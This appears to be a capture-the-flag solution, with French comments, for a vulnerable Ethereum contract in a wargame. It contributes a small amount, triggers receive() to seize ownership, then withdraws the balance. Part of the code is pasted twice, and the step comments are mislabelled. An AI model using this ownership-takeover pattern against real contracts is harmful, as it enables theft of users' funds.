// 1) contribuer
await contract.contribute({ value: web3.utils.toWei("0.0005", "ether") })

// 2) déclencher receive()
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  value: "1"
})

// 3) ownership
// 1) contribuer
await contract.contribute({ value: web3.utils.toWei("0.0005", "ether") })

// 2) déclencher receive()
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  value: "1"
})

// 3) withdraw
await contract.owner()

// 4) withdraw
await contract.withdraw()